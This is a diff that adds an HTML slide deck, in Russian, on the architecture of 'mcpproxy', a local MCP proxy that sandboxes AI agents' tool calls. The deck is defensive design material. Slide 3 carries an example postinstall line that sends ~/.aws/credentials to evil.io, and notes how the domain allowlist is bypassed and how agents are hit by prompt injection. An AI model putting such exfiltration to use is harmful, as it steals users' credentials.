@@ -1,0 +1,654 @@
+<title>Архитектура mcpproxy</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+
+<style>
+:root{
+  --paper:#EDEFF3; --surface:#FFFFFF; --surface-2:#F5F7FA; --surface-3:#E6EAF1;
+  --ink:#131820; --ink-2:#3D4756; --muted:#6B7789;
+  --line:#D6DCE5; --line-strong:#B9C3D0;
+  --accent:#2B5DA8; --accent-soft:#DCE6F5; --on-accent:#FFFFFF;
+  --deny:#B3372C; --deny-soft:#FAE7E4;
+  --allow:#12735A; --allow-soft:#DDF0E9;
+  --warn:#8A6206; --warn-soft:#F8EEDA;
+  --shadow:0 1px 2px rgba(19,24,32,.05), 0 8px 24px rgba(19,24,32,.06);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --paper:#0D1117; --surface:#141A22; --surface-2:#1A212B; --surface-3:#212A36;
+    --ink:#E4E9F0; --ink-2:#BAC4D1; --muted:#8592A3;
+    --line:#26303D; --line-strong:#3A4758;
+    --accent:#7BA7E8; --accent-soft:#1B2838; --on-accent:#0D1117;
+    --deny:#E68276; --deny-soft:#33201D;
+    --allow:#56C39C; --allow-soft:#152B25;
+    --warn:#D8A952; --warn-soft:#2C2415;
+    --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 28px rgba(0,0,0,.35);
+  }
+}
+:root[data-theme="dark"]{
+  --paper:#0D1117; --surface:#141A22; --surface-2:#1A212B; --surface-3:#212A36;
+  --ink:#E4E9F0; --ink-2:#BAC4D1; --muted:#8592A3;
+  --line:#26303D; --line-strong:#3A4758;
+  --accent:#7BA7E8; --accent-soft:#1B2838; --on-accent:#0D1117;
+  --deny:#E68276; --deny-soft:#33201D;
+  --allow:#56C39C; --allow-soft:#152B25;
+  --warn:#D8A952; --warn-soft:#2C2415;
+  --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 28px rgba(0,0,0,.35);
+}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--paper); color:var(--ink);
+  font-family:"IBM Plex Sans",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+  font-size:16px; line-height:1.5; -webkit-font-smoothing:antialiased;
+  scroll-snap-type:y proximity;
+}
+@media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto} }
+
+/* ---------- deck chrome ---------- */
+.rail{
+  position:fixed; left:0; top:0; bottom:0; width:64px; z-index:20;
+  display:flex; flex-direction:column; align-items:center; justify-content:center; gap:14px;
+  background:linear-gradient(90deg,var(--paper) 62%,transparent);
+}
+.rail a{
+  display:flex; align-items:center; justify-content:center;
+  width:30px; height:30px; border-radius:50%;
+  border:1px solid var(--line-strong); color:var(--muted); text-decoration:none;
+  font-family:"IBM Plex Mono",ui-monospace,monospace; font-size:11px; font-weight:500;
+  background:var(--surface); transition:border-color .15s,color .15s,background .15s;
+}
+.rail a:hover{color:var(--ink); border-color:var(--accent)}
+.rail a[aria-current="true"]{background:var(--accent); border-color:var(--accent); color:var(--on-accent)}
+.rail a:focus-visible, .lnk:focus-visible{outline:2px solid var(--accent); outline-offset:2px}
+
+/* ---------- slide ---------- */
+.slide{
+  scroll-snap-align:start; min-height:100vh;
+  padding:44px 48px 40px 84px;
+  display:flex; flex-direction:column; gap:20px;
+  border-bottom:1px solid var(--line);
+}
+.head{display:flex; align-items:flex-start; gap:18px; border-bottom:1px solid var(--line); padding-bottom:14px}
+.num{
+  font-family:"IBM Plex Mono",ui-monospace,monospace; font-size:12px; font-weight:600;
+  color:var(--accent); letter-spacing:.08em; padding-top:8px; flex:0 0 auto;
+}
+h1,h2{font-family:Archivo,"IBM Plex Sans",sans-serif; text-wrap:balance; margin:0; letter-spacing:-.015em}
+h1{font-size:clamp(26px,3.1vw,42px); font-weight:700; line-height:1.1}
+h2{font-size:clamp(22px,2.5vw,32px); font-weight:700; line-height:1.15}
+.eyebrow{
+  font-family:"IBM Plex Mono",ui-monospace,monospace; font-size:11px; font-weight:500;
+  text-transform:uppercase; letter-spacing:.14em; color:var(--muted); margin:0 0 6px;
+}
+.deck-mark{margin-left:auto; text-align:right; flex:0 0 auto}
+.deck-mark b{font-family:Archivo,sans-serif; font-size:13px; letter-spacing:.02em; display:block}
+.deck-mark span{font-family:"IBM Plex Mono",monospace; font-size:11px; color:var(--muted)}
+
+.body{display:grid; gap:20px; align-content:start}
+.cols-2{grid-template-columns:1fr 1fr}
+.cols-3{grid-template-columns:1fr 1fr 1fr}
+.cols-2u{grid-template-columns:minmax(0,1.05fr) minmax(0,1fr)}
+.stack{display:flex; flex-direction:column; gap:16px; min-width:0}
+@media (max-width:1000px){
+  .cols-2,.cols-3,.cols-2u{grid-template-columns:1fr}
+  .slide{padding:36px 24px 32px 76px}
+}
+
+.card{
+  background:var(--surface); border:1px solid var(--line); border-radius:10px;
+  padding:18px 20px; box-shadow:var(--shadow); min-width:0;
+}
+.card.flat{box-shadow:none; background:var(--surface-2)}
+.card.marked{border-left:3px solid var(--accent)}
+.card h3{
+  font-family:Archivo,sans-serif; font-size:13px; font-weight:600; margin:0 0 12px;
+  text-transform:uppercase; letter-spacing:.1em; color:var(--muted);
+}
+.card p{margin:0 0 10px; color:var(--ink-2); max-width:64ch}
+.card p:last-child{margin-bottom:0}
+
+.thesis{
+  font-family:Archivo,sans-serif; font-size:clamp(15px,1.55vw,20px); line-height:1.45;
+  font-weight:500; margin:0; max-width:66ch; color:var(--ink);
+}
+.thesis b{color:var(--accent); font-weight:700}
+.thesis.sm{font-size:17px}
+.thesis + .thesis{margin-top:12px}
+
+ul.list{list-style:none; margin:0; padding:0; display:flex; flex-direction:column; gap:10px}
+ul.list li{display:grid; grid-template-columns:auto 1fr; gap:10px; align-items:baseline; color:var(--ink-2)}
+ul.list li i{
+  font-style:normal; font-family:"IBM Plex Mono",monospace; font-size:11px; font-weight:600;
+  color:var(--accent); letter-spacing:.04em;
+}
+ul.list li b{color:var(--ink); font-weight:600}
+ul.list li b.q{color:var(--deny)}
+
+.mono{font-family:"IBM Plex Mono",ui-monospace,monospace}
+code{
+  font-family:"IBM Plex Mono",ui-monospace,monospace; font-size:.88em;
+  background:var(--surface-3); padding:1px 5px; border-radius:4px; color:var(--ink);
+}
+pre{
+  font-family:"IBM Plex Mono",ui-monospace,monospace; font-size:12.5px; line-height:1.6;
+  background:var(--surface-2); border:1px solid var(--line); border-radius:8px;
+  padding:14px 16px; margin:0; overflow-x:auto; color:var(--ink-2);
+}
+pre b{color:var(--deny); font-weight:600}
+pre .dim{color:var(--muted)}
+pre.tight{font-size:11.5px}
+
+table{border-collapse:collapse; width:100%; font-size:13.5px}
+.tw{overflow-x:auto}
+th,td{text-align:left; padding:8px 10px; border-bottom:1px solid var(--line); vertical-align:top}
+th{
+  font-family:"IBM Plex Mono",monospace; font-size:10.5px; text-transform:uppercase;
+  letter-spacing:.1em; color:var(--muted); font-weight:600; white-space:nowrap;
+}
+td.rule{font-family:"IBM Plex Mono",monospace; font-size:12px}
+tbody tr:last-child td{border-bottom:0}
+.tag{
+  font-family:"IBM Plex Mono",monospace; font-size:11px; font-weight:600;
+  padding:2px 7px; border-radius:4px; white-space:nowrap; display:inline-block;
+}
+.tag.deny{background:var(--deny-soft); color:var(--deny)}
+.tag.allow{background:var(--allow-soft); color:var(--allow)}
+.tag.warn{background:var(--warn-soft); color:var(--warn)}
+.tag.plain{background:var(--surface-3); color:var(--ink-2)}
+
+.caveat{
+  border-left:3px solid var(--warn); background:var(--warn-soft);
+  padding:12px 16px; border-radius:0 8px 8px 0; color:var(--ink-2); font-size:14px;
+}
+.caveat b.lbl{
+  display:block; font-family:"IBM Plex Mono",monospace; font-size:10.5px;
+  text-transform:uppercase; letter-spacing:.12em; color:var(--warn); margin-bottom:4px;
+}
+.note{font-size:12.5px; color:var(--muted); margin:12px 0 0}
+.note:first-child{margin-top:0}
+.note b{color:var(--ink-2)}
+.note b.warn{color:var(--warn)}
+.note a, .lnk{color:var(--accent); text-decoration:underline; text-underline-offset:2px}
+.chips{display:flex; flex-wrap:wrap; gap:6px; margin-top:8px}
+
+figure{margin:0}
+figure svg{display:block; width:100%; max-width:760px; height:auto; color:var(--line-strong)}
+figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch}
+.svg-box{fill:var(--surface); stroke:var(--line-strong)}
+.svg-core{fill:var(--accent-soft); stroke:var(--accent)}
+.svg-t{fill:var(--ink); font-family:"IBM Plex Sans",sans-serif; font-size:13px; font-weight:600}
+.svg-s{fill:var(--muted); font-family:"IBM Plex Mono",monospace; font-size:10.5px}
+.svg-e{fill:var(--ink-2); font-family:"IBM Plex Mono",monospace; font-size:10.5px}
+.svg-l{stroke:currentColor; fill:none; stroke-width:1.5}
+
+/* two lines of defence */
+.lines{display:grid; grid-template-columns:1fr auto 1fr; gap:14px; align-items:stretch}
+@media (max-width:1000px){ .lines{grid-template-columns:1fr} }
+.defline{border:1px solid var(--line-strong); border-radius:10px; padding:16px 18px; background:var(--surface)}
+.defline.one{border-top:3px solid var(--accent)}
+.defline.two{border-top:3px solid var(--allow)}
+.defline .who{font-family:Archivo,sans-serif; font-size:19px; font-weight:700; margin:0 0 2px; color:var(--ink)}
+.defline .ctl{font-family:"IBM Plex Mono",monospace; font-size:11px; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); margin:0 0 10px}
+.defline .what{margin:0 0 8px; color:var(--ink); font-size:15px}
+.defline .how{margin:0; font-family:"IBM Plex Mono",monospace; font-size:12px; color:var(--ink-2)}
+.joint{display:flex; align-items:center; justify-content:center; color:var(--muted); font-family:"IBM Plex Mono",monospace; font-size:11px; white-space:nowrap}
+
+/* stage rail */
+.stages{display:flex; flex-direction:column; gap:3px; font-family:"IBM Plex Mono",monospace; font-size:12.5px}
+.stages span{
+  display:grid; grid-template-columns:26px 1fr; gap:8px; color:var(--ink-2);
+  padding:3px 8px; border-left:2px solid var(--line); align-items:baseline;
+}
+.stages span em{font-style:normal; color:var(--muted); font-size:10.5px}
+.stages span.gate{border-left-color:var(--accent); color:var(--ink); background:var(--accent-soft)}
+.stages span.opt{border-left-style:dashed; color:var(--muted)}
+
+.footer{
+  padding:22px 48px 30px 84px; border-top:1px solid var(--line);
+  font-size:12px; color:var(--muted); display:flex; flex-wrap:wrap; gap:6px 22px;
+  background:var(--paper);
+}
+@media (max-width:1000px){ .footer{padding:20px 24px 26px 76px} }
+</style>
+
+<nav class="rail" aria-label="Слайды">
+  <a href="#s1" data-dot="s1">1</a>
+  <a href="#s2" data-dot="s2">2</a>
+  <a href="#s3" data-dot="s3">3</a>
+  <a href="#s4" data-dot="s4">4</a>
+  <a href="#s5" data-dot="s5">5</a>
+</nav>
+
+<!-- ═══════════ 1 · проблема ═══════════ -->
+<section class="slide" id="s1">
+  <div class="head">
+    <div class="num">01</div>
+    <div>
+      <p class="eyebrow">Проблема</p>
+      <h1>У агента есть shell — значит, у него есть всё</h1>
+    </div>
+    <div class="deck-mark"><b>mcpproxy</b><span>демо · архитектура</span></div>
+  </div>
+
+  <p class="thesis">
+    Модель говорит, <b>что</b> сделать. Прокси решает, <b>чем</b> это сделать.
+    ОС решает, <b>что запущенное может</b>. Человек видит всё три.
+  </p>
+
+  <div class="body cols-2u">
+    <div class="card">
+      <h3>Что даёт прямой терминал</h3>
+      <ul class="list">
+        <li><i>01</i><span><b>Инъекция команд</b> — произвольный текст доезжает до Bash</span></li>
+        <li><i>02</i><span><b>Несанкционированный доступ к файлам</b> — граница директории существует только на словах</span></li>
+        <li><i>03</i><span><b>Утечка секретов</b> — процесс наследует окружение целиком</span></li>
+        <li><i>04</i><span><b>Действия, продиктованные недоверенным контентом</b> — indirect prompt injection из логов, issue, README</span></li>
+      </ul>
+      <p class="note">Прямой вызов скрипта не даёт ни песочницы, ни аудита, ни подтверждений.</p>
+    </div>
+
+    <div class="stack">
+      <div class="card flat">
+        <h3>Гипотеза</h3>
+        <p>Локальный MCP-прокси, который отдаёт модели <b>только предопределённые инструменты</b>
+        и валидирует их параметры, позволяет автоматизировать локальные задачи, не выдавая модели
+        произвольный shell. Никакого <code>execute_command</code>. Рецепт — это capability.</p>
+      </div>
+      <div class="card flat">
+        <h3>В чём новизна — и в чём её нет</h3>
+        <p><b class="q">Неверно:</b> «новизна в том, что мы делаем allowlist бинарей и валидируем параметры».
+        Это уже сделано и лежит на GitHub.</p>
+        <p><b>Верно:</b> allowlist защищает от того, что модель <b>попросит запустить</b>.
+        Он ничего не делает против того, что запущенный код <b>сделает</b>.
+        Существующие решения останавливаются на первом. Мы делаем второе — и показываем это человеку.</p>
+      </div>
+    </div>
+  </div>
+  <p class="note">Источник: <code>docs/01-problem.md</code> · <code>docs/05-prior-art.md</code></p>
+</section>
+
+<!-- ═══════════ 2 · топология ═══════════ -->
+<section class="slide" id="s2">
+  <div class="head">
+    <div class="num">02</div>
+    <div>
+      <p class="eyebrow">Топология</p>
+      <h2>Три части, потому что Electron не может быть хостом MCP-сервера</h2>
+    </div>
+  </div>
+
+  <div class="body cols-2u">
+    <figure>
+      <svg viewBox="0 0 760 486" role="img" aria-label="Топология: MCP-клиент по stdio обращается к shim, shim по unix-сокету к демону mcpproxyd; демон отдаёт поток событий в Electron UI и получает вердикт по апруву, и спавнит дочерний процесс в песочнице без shell">
+        <defs>
+          <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+            <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+          </marker>
+        </defs>
+
+        <rect class="svg-box" x="70" y="16" width="260" height="50" rx="8" stroke-width="1.5"/>
+        <text class="svg-t" x="200" y="38" text-anchor="middle">MCP-клиент</text>
+        <text class="svg-s" x="200" y="55" text-anchor="middle">Claude Code, Cursor, …</text>
+
+        <rect class="svg-box" x="70" y="126" width="260" height="60" rx="8" stroke-width="1.5"/>
+        <text class="svg-t" x="200" y="151" text-anchor="middle">mcpproxy-shim</text>
+        <text class="svg-s" x="200" y="169" text-anchor="middle">тонкий stdio-мост, ~200 строк</text>
+
+        <rect class="svg-core" x="70" y="266" width="260" height="50" rx="8" stroke-width="2"/>
+        <text class="svg-t" x="200" y="288" text-anchor="middle">mcpproxyd</text>
+        <text class="svg-s" x="200" y="305" text-anchor="middle">ЯДРО · политика · аудит</text>
+
+        <rect class="svg-box" x="460" y="266" width="260" height="50" rx="8" stroke-width="1.5"/>
+        <text class="svg-t" x="590" y="288" text-anchor="middle">Electron UI</text>
+        <text class="svg-s" x="590" y="305" text-anchor="middle">наблюдение · подтверждения</text>
+
+        <rect class="svg-box" x="70" y="396" width="260" height="60" rx="8" stroke-width="1.5"/>
+        <text class="svg-t" x="200" y="421" text-anchor="middle">Дочерний процесс</text>
+        <text class="svg-s" x="200" y="439" text-anchor="middle">в песочнице</text>
+
+        <line class="svg-l" x1="200" y1="66" x2="200" y2="120" marker-end="url(#ar)"/>
+        <line class="svg-l" x1="200" y1="186" x2="200" y2="260" marker-end="url(#ar)"/>
+        <line class="svg-l" x1="168" y1="316" x2="168" y2="390" marker-end="url(#ar)"/>
+        <line class="svg-l" x1="236" y1="396" x2="236" y2="322" marker-end="url(#ar)" stroke-dasharray="5 4"/>
+        <line class="svg-l" x1="330" y1="281" x2="454" y2="281" marker-end="url(#ar)"/>
+        <line class="svg-l" x1="460" y1="302" x2="336" y2="302" marker-end="url(#ar)"/>
+
+        <text class="svg-e" x="212" y="98">stdio / JSON-RPC</text>
+        <text class="svg-e" x="212" y="217">unix socket 0600</text>
+        <text class="svg-e" x="212" y="233">+ каталог 0700 + токен</text>
+        <text class="svg-e" x="180" y="345">spawn(argv[])</text>
+        <text class="svg-e" x="180" y="361">без shell</text>
+        <text class="svg-e" x="250" y="379">stdout / stderr</text>
+        <text class="svg-e" x="250" y="395">+ sandbox violations</text>
+        <text class="svg-e" x="392" y="275">поток событий</text>
+        <text class="svg-e" x="392" y="319">вердикт по апруву</text>
+      </svg>
+      <figcaption>Каноническая топология. Клиент требует stdio-subprocess — им становится дешёвый одноразовый shim;
+      вся политика живёт в одном демоне на все сессии.</figcaption>
+    </figure>
+
+    <div class="stack">
+      <div class="card">
+        <h3>Почему именно так — ADR-0001</h3>
+        <div class="tw"><table>
+          <thead><tr><th>Компонент</th><th>Почему отдельно</th></tr></thead>
+          <tbody>
+            <tr><td class="rule"><code>shim</code></td><td>клиент требует stdio-subprocess; он обязан быть дешёвым и одноразовым</td></tr>
+            <tr><td class="rule"><code>mcpproxyd</code></td><td>одна точка истины на все сессии, переживает перезапуск клиента</td></tr>
+            <tr><td class="rule"><code>packages/core</code></td><td>вся логика демона как библиотека <b>без единого импорта Electron</b> — CI без дисплея</td></tr>
+            <tr><td class="rule"><code>desktop</code></td><td>подтверждения обязаны быть <b>вне контекста модели</b></td></tr>
+          </tbody>
+        </table></div>
+        <p class="note">Спавнить Electron на каждую сессию неприемлемо: множественные окна, тяжёлый старт, нет единого аудита.
+        Приложение не запущено — shim его поднимает; флаг <code>--require-ui</code> включает строгий fail-closed.</p>
+      </div>
+
+      <div class="card flat">
+        <h3>Сокет — граница безопасности</h3>
+        <ul class="list">
+          <li><i>И5</i><span>по IPC приходит <code>{recipeName, params, sessionId}</code> — <b>никогда argv и никогда путь к бинарю</b></span></li>
+          <li><i>И6</i><span>unix-сокет <code>0600</code> в каталоге <code>0700</code>, per-session токен вне конфига и вне argv shim'а</span></li>
+        </ul>
+        <p class="note">Спецификация MCP описывает атаку
+        <a class="lnk" href="https://modelcontextprotocol.io/specification/draft/basic/security_best_practices">«stdio Transport Security in Proxy Scenarios»</a>
+        буквально про эту архитектуру: прокси, который спавнит процессы, плюс украденный токен = RCE.
+        Полный контроль над сокетом даёт только вызов существующих рецептов с валидируемыми параметрами.</p>
+        <p class="note"><b class="warn">Честно:</b> проверки peer credentials <b>нет</b> — <code>LOCAL_PEERCRED</code>
+        недостижим из чистого Node (проба П11). Свойство «подключается только этот пользователь» держат
+        права каталога <code>0700</code>, которые ОС применяет при разрешении пути.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════ 3 · две линии ═══════════ -->
+<section class="slide" id="s3">
+  <div class="head">
+    <div class="num">03</div>
+    <div>
+      <p class="eyebrow">Центральный тезис · кульминация демо</p>
+      <h2>Две линии обороны</h2>
+    </div>
+  </div>
+
+  <div class="lines">
+    <div class="defline one">
+      <p class="who">Линия 1 — валидатор</p>
+      <p class="ctl">контролирует модель</p>
+      <p class="what">Что именно запускается</p>
+      <p class="how">argv · схемы параметров · realpath + confinement</p>
+    </div>
+    <div class="joint">— argv собран →</div>
+    <div class="defline two">
+      <p class="who">Линия 2 — песочница</p>
+      <p class="ctl">контролирует код</p>
+      <p class="what">Что запущенное может сделать</p>
+      <p class="how">ФС · сеть · лимиты · нарушения в таймлайн</p>
+    </div>
+  </div>
+
+  <div class="body cols-2u">
+    <div class="card">
+      <h3>Цепочка, которую валидатор не видит</h3>
+      <pre>pnpm test
+ └─ package.json из репо <span class="dim">(изменяем кем угодно)</span>
+     └─ vitest
+         └─ ~1200 пакетов из node_modules
+             └─ <b>postinstall → fetch('https://evil.io',
+                    body: ~/.aws/credentials)</b></pre>
+      <p class="note">Параметры валидны · бинарь в allowlist · директория правильная ·
+      <b class="warn">ключи утекли</b>. Валидатор отработал безупречно.
+      Утечку принёс код, который этот валидный вызов запустил — внутрь процесса валидатор не видит.</p>
+    </div>
+
+    <div class="card">
+      <h3>Сценарий S5 — один вызов, два клика</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Режим</th><th>Тесты</th><th>Сеть</th><th>ФС</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="rule"><code>none</code></td>
+            <td>прошли ✅</td>
+            <td><span class="tag deny">🔴 evil.io:443 — 1.2 KB отправлено</span></td>
+            <td><span class="tag deny">🔴 ~/.aws/credentials прочитан</span></td>
+          </tr>
+          <tr>
+            <td class="rule"><code>seatbelt</code></td>
+            <td>прошли ✅</td>
+            <td><span class="tag allow">🟢 denied, 0 байт</span></td>
+            <td><span class="tag allow">🟢 denied</span></td>
+          </tr>
+        </tbody>
+      </table></div>
+      <p class="note">Baseline <code>none</code> — <b>наблюдающий, а не слепой</b>: тот же HTTP/SOCKS5-прокси
+      отдаётся ребёнку через proxy-переменные, поэтому эксфильтрация видна и посчитана в байтах — просто не запрещена.
+      Это ожидаемая картина демо-сценария S5, а не результат замера: прогона red-team корпуса ещё не было.</p>
+    </div>
+  </div>
+
+  <div class="caveat">
+    <b class="lbl">Оговорка</b>
+    Фильтрация идёт <b>по доменам, а не по содержимому</b>. Замените <code>evil.io</code> на разрешённый
+    <code>api.github.com</code> — эксфильтрация в собственный gist атакующего пройдёт. Domain fronting тоже обходится.
+    Мы поднимаем стоимость атаки; мы не делаем её невозможной.
+  </div>
+  <p class="note">За этим стоит: <code>03-threat-model.md</code> — две линии обороны · ADR-0002 (seatbelt через
+  <code>@anthropic-ai/sandbox-runtime</code>) · ADR-0007 (доменный allowlist) · атака A9 · OWASP ASI04 + ASI05 ·
+  класс подмены рецепта подтверждён CVE-2025-54136</p>
+</section>
+
+<!-- ═══════════ 4 · механика ═══════════ -->
+<section class="slide" id="s4">
+  <div class="head">
+    <div class="num">04</div>
+    <div>
+      <p class="eyebrow">Механика</p>
+      <h2>Путь вызова, инварианты, права</h2>
+    </div>
+  </div>
+
+  <div class="body cols-3">
+    <div class="card">
+      <h3>Стадии вызова = события таймлайна</h3>
+      <div class="stages">
+        <span><em>01</em>received</span>
+        <span><em>02</em>lock_check <em>· rug pull?</em></span>
+        <span><em>03</em>validate</span>
+        <span><em>04</em>resolve_paths</span>
+        <span><em>05</em>build_argv</span>
+        <span><em>06</em>classify_risk</span>
+        <span class="gate"><em>07</em>approval <em>· если high</em></span>
+        <span><em>08</em>build_env</span>
+        <span><em>09</em>build_profile</span>
+        <span><em>10</em>spawn</span>
+        <span><em>11</em>redact</span>
+        <span><em>12</em>complete</span>
+        <span class="opt"><em>13</em>violation <em>· 0..n</em></span>
+      </div>
+      <p class="note">Видно, на каком шаге вызов остановился — эта пошаговость и делает демо наглядным.
+      Во frozen <code>stageOrder</code> тринадцать стадий; успешный вызов даёт двенадцать событий:
+      <code>violation</code> помечен как «может произойти много раз», и ноль — легальное число.
+      Стадия, до которой вызов не дошёл, не даёт события вовсе.</p>
+    </div>
+
+    <div class="card">
+      <h3>Инварианты — фиксируются в коде и тестах</h3>
+      <ul class="list">
+        <li><i>И1</i><span><b>Нет shell. Никогда.</b> Только <code>spawn(argv[])</code>. Строки команды не существует — инжектить не во что</span></li>
+        <li><i>И2</i><span>Параметры не склеиваются, а <b>занимают слоты argv</b></span></li>
+        <li><i>И3</i><span>Пути — <b>realpath + confinement</b>. Проверка «нет <code>..</code>» обходится симлинком за десять секунд</span></li>
+        <li><i>И4</i><span><b>Env-allowlist</b>: секрет не попадает в процесс. Редакция вывода — страховочная сетка, не основной механизм</span></li>
+        <li><i>И5</i><span>Демон принимает <b>имена рецептов</b>, а не команды</span></li>
+        <li><i>И6</i><span>IPC-сокет — граница безопасности</span></li>
+        <li><i>И7</i><span><b>Вывод скрипта — недоверенные данные</b>: маркер, скан, обрезка (OWASP ASI01)</span></li>
+        <li><i>И8</i><span>Electron IPC — тоже граница: <code>contextIsolation</code>, <code>sandbox</code>, жёсткий CSP</span></li>
+      </ul>
+    </div>
+
+    <div class="stack">
+      <div class="card">
+        <h3>Права песочницы — асимметричны</h3>
+        <div class="tw"><table>
+          <thead><tr><th>Операция</th><th>По умолчанию</th><th>Приоритет</th></tr></thead>
+          <tbody>
+            <tr><td>Чтение</td><td><span class="tag allow">разрешено</span></td><td class="rule"><code>allowRead</code> бьёт <code>denyRead</code></td></tr>
+            <tr><td>Запись</td><td><span class="tag deny">запрещено</span></td><td class="rule"><code>denyWrite</code> бьёт <code>allowWrite</code></td></tr>
+            <tr><td>Сеть</td><td><span class="tag deny">запрещена</span></td><td class="rule">доменный allowlist через прокси</td></tr>
+          </tbody>
+        </table></div>
+        <p class="note"><b>Mandatory deny</b> — не снимается даже явным allow:
+        <code>.bashrc</code> <code>.zshrc</code> <code>.profile</code> <code>.gitconfig</code> <code>.git/hooks/</code>
+        <code>.vscode/</code> <code>.idea/</code> <code>.claude/commands/</code>.
+        Это persistence-векторы: запись туда даёт исполнение позже, уже вне песочницы.</p>
+      </div>
+      <div class="card flat">
+        <h3>Аудит — hash-chain</h3>
+        <pre class="tight">self = sha256(utf8(
+  canonicalizeJcs({ prev, event })))</pre>
+        <p class="note">Хэшируется <b>всё событие целиком</b> вместе со ссылкой на предыдущую запись —
+        перечисление полей было бы дырой. Проверяется не только дайджест, но и связь:
+        <code>prev</code> каждой записи обязан совпадать с <code>self</code> предыдущей.</p>
+        <p class="note"><b class="warn">Чего цепочка не ловит:</b> обрезание хвоста лога — удалив последние записи
+        целиком, атакующий оставляет цепочку согласованной. Нужен внешний якорь.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════ 5 · границы ═══════════ -->
+<section class="slide" id="s5">
+  <div class="head">
+    <div class="num">05</div>
+    <div>
+      <p class="eyebrow">Честные границы</p>
+      <h2>Где мы сильны, где частично и где нас нет</h2>
+    </div>
+  </div>
+
+  <div class="body cols-3">
+    <div class="card">
+      <h3><span class="tag allow">●</span> Защищаем хорошо</h3>
+      <ul class="list">
+        <li><i>—</i><span>Инъекция через параметры — <b>структурная</b> защита, строки команды не существует</span></li>
+        <li><i>—</i><span>Выход за границы директорий — две независимые линии</span></li>
+        <li><i>—</i><span>Утечка секретов из окружения — защита на входе, а не фильтр на выходе</span></li>
+        <li><i>—</i><span>Эксфильтрация в неразрешённый домен — deny-by-default на всё дерево процессов</span></li>
+        <li><i>—</i><span>Persistence через shell-конфиги и git-hooks — неснимаемый deny</span></li>
+        <li><i>—</i><span>Тихая подмена рецепта — lock-файл + diff-approve</span></li>
+        <li><i>—</i><span>Подделка подтверждения — out-of-band канал вне контекста модели</span></li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3><span class="tag warn">◐</span> Защищаем частично</h3>
+      <ul class="list">
+        <li><i>—</i><span><b>Разрешённый домен</b>: фильтруем по домену, не по содержимому</span></li>
+        <li><i>—</i><span><b>Indirect prompt injection в выводе</b>: помечен, отсканирован, обрезан — но модель его всё равно читает. Уменьшаем вероятность, не устраняем класс</span></li>
+        <li><i>—</i><span><b>Редакция секретов</b>: энтропия ловит 1 % токенов длиной 23 символа, 29 % — 28, 98 % — 40. Для hex порога не существует вовсе: ключ Twilio (p50 3.62) и git sha (3.70) неотличимы</span></li>
+        <li><i>—</i><span><b>ReDoS</b>: RE2 закрывает демон, но строка <code>pattern</code> уезжает MCP-клиенту в <code>inputSchema</code>, а его движок бэктрекает</span></li>
+        <li><i>—</i><span><b>Учётные данные пира сокета</b> не проверяем — свойство держат права каталога <code>0700</code></span></li>
+        <li><i>—</i><span><b>Усталость от подтверждений</b>: если high-risk станет частым, человек начнёт нажимать не глядя</span></li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3><span class="tag deny">○</span> Не защищаем вообще</h3>
+      <ul class="list">
+        <li><i>—</i><span><b>Злонамеренного пользователя</b> — это его машина</span></li>
+        <li><i>—</i><span><b>Ядро macOS и сам <code>sandbox-exec</code></b> — Apple формально считает его deprecated</span></li>
+        <li><i>—</i><span><b>Саму модель</b> — влияем только на то, что она физически может вызвать</span></li>
+        <li><i>—</i><span><b>Провенанс пакетов</b> — ловим поведение в рантайме, подписи не проверяем</span></li>
+        <li><i>—</i><span><b>Tamper-proof аудит</b> — наш лог tamper-<b>evident</b></span></li>
+        <li><i>—</i><span><b>Корпоративные сценарии</b> — RBAC и SSO это задача MCP-гейтвеев</span></li>
+      </ul>
+      <p class="note"><b>Статус среза:</b></p>
+      <div class="chips">
+        <span class="tag allow">seatbelt — основная</span>
+        <span class="tag allow">none — baseline</span>
+        <span class="tag plain">container — заглушка</span>
+        <span class="tag plain">Windows / Linux — не реализованы</span>
+        <span class="tag plain">Merkle-корень — вне среза</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="body cols-2u">
+    <div class="card marked">
+      <h3>Формулировка для сцены</h3>
+      <p class="thesis sm">Мы не решаем prompt injection. Мы сводим поверхность к нулю там, где раньше был shell,
+      и делаем всё остальное видимым.</p>
+      <p class="thesis sm">Мы не делаем атаку невозможной. Мы поднимаем её стоимость и гарантируем,
+      что она оставит след.</p>
+    </div>
+    <div class="card flat">
+      <h3>Что честно считать провалом — пороги зафиксированы до прогона</h3>
+      <ul class="list">
+        <li><i>✕</i><span>корпус атак пробивается через аргументы, пути или вывод</span></li>
+        <li><i>✕</i><span>типовые задачи требуют больше <b>5 %</b> исключений</span></li>
+        <li><i>✕</i><span>ложные блокировки выше <b>5 %</b></span></li>
+        <li><i>✕</i><span>baseline <code>none</code> показывает ASR, близкий к seatbelt-режиму</span></li>
+      </ul>
+      <p class="note">Цифр ASR и Utility на слайдах нет намеренно: прогона не было.
+      Подгонять пороги после замера — значит не проводить эксперимент.</p>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <span>Источник истины — <code>docs/</code>, слайды производные</span>
+  <span><a class="lnk" href="https://modelcontextprotocol.io/specification/draft/basic/security_best_practices">MCP · Security Best Practices</a></span>
+  <span>CVE-2025-54136</span>
+  <span>OWASP ASI01 · ASI04 · ASI05</span>
+  <span><code>@anthropic-ai/sandbox-runtime@0.0.74</code> — пробы П1–П11</span>
